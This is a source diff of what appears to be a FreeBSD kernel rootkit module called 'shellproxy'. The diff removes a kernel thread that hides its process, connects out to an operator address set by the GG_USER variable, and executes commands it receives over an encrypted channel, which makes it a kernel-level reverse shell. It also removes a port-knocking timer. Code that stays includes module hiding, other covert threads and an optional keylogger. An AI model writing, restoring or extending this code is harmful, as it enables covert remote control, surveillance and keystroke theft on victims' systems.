@@ -28,9 +28,6 @@
 #include <vm/vm_object.h>
 #include <net/vnet.h>
 #include <netinet/in.h>
-#include <netinet/ip.h>
-#include <netinet/ip_icmp.h>
-#include <netinet/icmp_var.h>
 
 #include "shellproxy.h"
 #include "ehook.h"
@@ -61,135 +58,11 @@ void load_kit_priv (void)
 	}
 }
 
-struct callout knock_callout;
 struct mtx proxy_mtx;
-struct proc * proxy_proc;
 int shutting_down;
-int fire;
 int mfire;
 int kthreads_started;
 int kthreads_done;
-u32 user_addr = USER_ADDR;
-
-static
-void proxy_run (void* arg)
-{
-	struct thread * td = curthread;
-	struct proc * p = td->td_proc;
-	struct socket* so;
-	struct sockaddr_in sa;
-	u8 tx[32], rx[32];
-	u8 cmd[MAX_PKT];
-	int n;
-	u64 rxctr;
-
-	(void)arg;
-
-	proxy_hide(p);
-
-	for (;;) {
-		mtx_lock(&proxy_mtx);
-		while (fire==0 && !shutting_down)
-			msleep(&fire, &proxy_mtx, PWAIT, "shellproxy", 0);
-		if (shutting_down) {
-			mtx_unlock(&proxy_mtx);
-			break;
-		}
-		fire--;
-		mtx_unlock(&proxy_mtx);
-
-		rxctr = 1; // fresh session so init at 1
-
-		CURVNET_SET_QUIET(vnet0);
-#ifdef DBGMODEDONTUSEME
-		printf("shellproxy at %p  vnet0 is %p, match? %d\n", curvnet, vnet0, curvnet==vnet0);
-#endif
-
-		// main channel
-		if (socreate(AF_INET, &so, SOCK_STREAM, IPPROTO_TCP,
-		    td->td_ucred, td)!=0)
-			goto next;
-		proxy_attr_socket(so);
-
-		memset(&sa, 0, sizeof(sa));
-		sa.sin_len = sizeof(sa);
-		sa.sin_family = AF_INET;
-		sa.sin_addr.s_addr = user_addr;
-		sa.sin_port = htons(USER_PORT);
-
-		if (soconnect(so, (struct sockaddr*)&sa, td)!=0) {
-			soclose(so);
-			goto next;
-		}
-
-		// soconnect is async: wait for SS_ISCONNECTED before sending
-		{
-			int waited = 0;
-			while (waited<50) {
-				SOCK_LOCK(so);
-				if (so->so_state&(SS_ISCONNECTED|SS_ISDISCONNECTED)) {
-					int bad = !(so->so_state&SS_ISCONNECTED);
-					SOCK_UNLOCK(so);
-					if (bad) {
-						soclose(so);
-						goto next;
-					}
-					break;
-				}
-				SOCK_UNLOCK(so);
-				tsleep(&so->so_timeo, PWAIT, "connwait", hz/20);
-				waited++;
-			}
-			if (waited>=50) {
-				soclose(so);
-				goto next;
-			}
-		}
-		proxy_attr_socket(so);
-
-		proxy_set_rcvtimeo(so, 30);
-
-		if (proxy_handshake(so, tx, rx)!=0) {
-#ifdef DBGMODEDONTUSEME
-			printf("shellproxy: hs FAIL. WHAT THE FUCK\n");
-#endif
-			soclose(so);
-			goto next;
-		}
-#ifdef DBGMODEDONTUSEME
-		printf("shellproxy: hs ok\n");
-#endif
-
-		while (proxy_pkt_recv(so, rx, rxctr, cmd, &n)==0) {
-			rxctr++;
-			cmd[n] = '\0';
-#ifdef DBGMODEDONTUSEME
-			printf("shellproxy: pkt %llu cmd [%s]\n", (unsigned long long)rxctr-1, cmd);
-#endif
-			proxy_execute((char*)cmd);
-#ifdef DBGMODEDONTUSEME
-			printf("shellproxy: pkt %llu fired\n", (unsigned long long)rxctr-1);
-#endif
-		}
-#ifdef DBGMODEDONTUSEME
-		printf("shellproxy: session ending\n");
-#endif
-		soclose(so);
-#ifdef DBGMODEDONTUSEME
-		printf("shellproxy: soclose done\n");
-#endif
-
-next:
-		CURVNET_RESTORE();
-	}
-
-	proxy_unhide(p);
-	mtx_lock(&proxy_mtx);
-	kthreads_done++;
-	wakeup(&kthreads_done);
-	mtx_unlock(&proxy_mtx);
-	kproc_exit(0);
-}
 
 static linker_file_t lfclone = NULL;
 
@@ -225,38 +98,14 @@ int shellproxy_load (struct module * m, int cmd, void* arg)
 		linker_file_foreach(findpred, &lfclone);
 		load_kit_priv();
 		mtx_init(&proxy_mtx, "shellproxy", NULL, MTX_DEF);
-		fire = 0;
 		mfire = 0;
 		shutting_down = 0;
 		kthreads_started = 0;
 		kthreads_done = 0;
-	{
-		char* op = kern_getenv("GG_USER");
-		if (op!=NULL) {
-			struct in_addr ia;
-			if (inet_aton(op, &ia)!=0)
-				user_addr = ia.s_addr;
-			freeenv(op);
-		}
-	}
-		// tweetnacl is pretty expensive per scalar mult. we need 8 pages in total  to be safe
-		error = kproc_create(proxy_run, NULL, &proxy_proc, 0, 8, "shellproxy");
-		if (error!=0) {
-			mtx_destroy(&proxy_mtx);
-			break;
-		}
-		kthreads_started++;
 		if (dd_start()==0)
 			kthreads_started++;
 		if (mqtt_start()==0)
 			kthreads_started++;
-#ifdef DBGMODEDONTUSEME
-		else
-			printf("shellproxy: dd start failed\n");
-#endif
-		callout_init(&knock_callout, 1);
-		callout_reset_sbt(&knock_callout, TICK_MS*SBT_1MS, 0,
-		    proxy_knock_tick, NULL, 0);
 		#ifdef CFG_KEYLOGGER
 		keylog_start();
 		#endif
